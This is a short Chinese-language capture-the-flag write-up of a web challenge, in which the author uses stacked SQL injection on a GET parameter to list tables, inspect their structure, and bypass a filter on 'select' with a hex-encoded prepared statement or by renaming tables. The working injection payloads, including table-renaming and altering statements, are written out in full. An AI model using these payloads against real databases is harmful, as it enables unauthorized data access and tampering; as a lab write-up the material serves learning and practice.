网页提供了一个输入框，点击提交将会发出get请求，参数为inject=\[输入的内容\]。看源码，注释里提示“sqlmap是没有灵魂的”。

我的尝试：

提交`admin' or '1'='1' #`，结果页面上显示这些东西。

```text
array(2) {
 [0]=>
 string(1) "1"
 [1]=>
 string(7) "hahahah"
}

array(2) {
 [0]=>
 string(1) "2"
 [1]=>
 string(12) "miaomiaomiao"
}

array(2) {
 [0]=>
 string(6) "114514"
 [1]=>
 string(2) "ys"
}
```

显然，这应该是查询语句所作用的表的所有记录，一共有3条。

为了找到flag，使用堆叠注入，输入`1';show tables;#`，查询所有表名。发现存在`words`和`1919810931114514`两个表。

<img src="image-20210227195602210.png" alt="image-20210227195602210" style="zoom:67%;" />

再使用desc查看两个表的结构，输入`1';desc words`，`1';desc 1919810931114514;# `。这里有个小trick，使用纯数字表名  要在表名前后加上 ``(这里由于markdown无法转义的问题，所以没有加入到行内代码块中，实际输入要在数字前后加上)。可以看到flag内容位于1919810931114514表中。

<img src="image-20210227202522051.png" alt="words表结构" style="zoom:67%;" />

<img src="image-20210227202426166.png" alt="1919810931114514表结构" style="zoom:67%;" />

接下来要想办法查询到该表中的flag内容。直接堆叠注入查询语句，会发现`select`等关键字都被过滤掉了。

![image-20210227202949683](image-20210227202949683.png)

于是有两种思路

### 思路1

使用MySql的prepare功能，这是一个类似于计划任务的功能。将select查询语句转换为16进制，然后prepare...from...来执行该语句。

```
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

### 思路2

直接修改表的名字，`rename`/`alter`等关键字是没有被筛选的，所以可以被输入执行。先将`words`表名改为其他名字，再将`1919810931114514`表名改为`words`，就可以从中查询。

```
1';rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
```